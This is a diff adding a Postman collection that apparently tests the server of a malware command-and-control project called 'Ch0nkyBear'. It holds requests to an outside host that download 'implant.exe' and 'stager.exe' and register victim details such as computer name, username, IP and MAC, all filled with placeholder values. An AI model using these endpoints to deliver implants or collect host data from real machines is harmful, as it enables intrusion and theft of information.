@@ -1,0 +1,128 @@
+{
+	"info": {
+		"_postman_id": "c73269b7-1ab9-401b-8f61-c7c72f02989d",
+		"name": "Ch0nkyBear",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+	},
+	"item": [
+		{
+			"name": "implant",
+			"protocolProfileBehavior": {
+				"disableBodyPruning": true
+			},
+			"request": {
+				"method": "GET",
+				"header": [
+					{
+						"key": "User-Agent",
+						"value": "ch0nky",
+						"type": "text"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "",
+					"options": {
+						"raw": {
+							"language": "json"
+						}
+					}
+				},
+				"url": {
+					"raw": "https://ch0nkybear.herokuapp.com/implant.exe",
+					"protocol": "https",
+					"host": [
+						"ch0nkybear",
+						"herokuapp",
+						"com"
+					],
+					"path": [
+						"implant.exe"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "stager",
+			"request": {
+				"method": "GET",
+				"header": [
+					{
+						"key": "User-Agent",
+						"value": "ch0nky",
+						"type": "text"
+					}
+				],
+				"url": {
+					"raw": "https://ch0nkybear.herokuapp.com/stager.exe",
+					"protocol": "https",
+					"host": [
+						"ch0nkybear",
+						"herokuapp",
+						"com"
+					],
+					"path": [
+						"stager.exe"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "register",
+			"request": {
+				"method": "POST",
+				"header": [],
+				"body": {
+					"mode": "raw",
+					"raw": "{\n    \"guid\": \"abcd1235\",\n    \"computerName\": \"Win15\",\n    \"username\": \"User\",\n    \"ip\": \"192.255.68.03\",\n    \"mac\": \"AB:CD:EF:GG\"\n}",
+					"options": {
+						"raw": {
+							"language": "json"
+						}
+					}
+				},
+				"url": {
+					"raw": "https://ch0nkybear.herokuapp.com/register",
+					"protocol": "https",
+					"host": [
+						"ch0nkybear",
+						"herokuapp",
+						"com"
+					],
+					"path": [
+						"register"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "db-info",
+			"request": {
+				"method": "GET",
+				"header": [
+					{
+						"key": "User-Agent",
+						"value": "ch0nky",
+						"type": "text"
+					}
+				],
+				"url": {
+					"raw": "https://ch0nkybear.herokuapp.com/",
+					"protocol": "https",
+					"host": [
+						"ch0nkybear",
+						"herokuapp",
+						"com"
+					],
+					"path": [
+						""
+					]
+				}
+			},
+			"response": []
+		}
+	]
+}
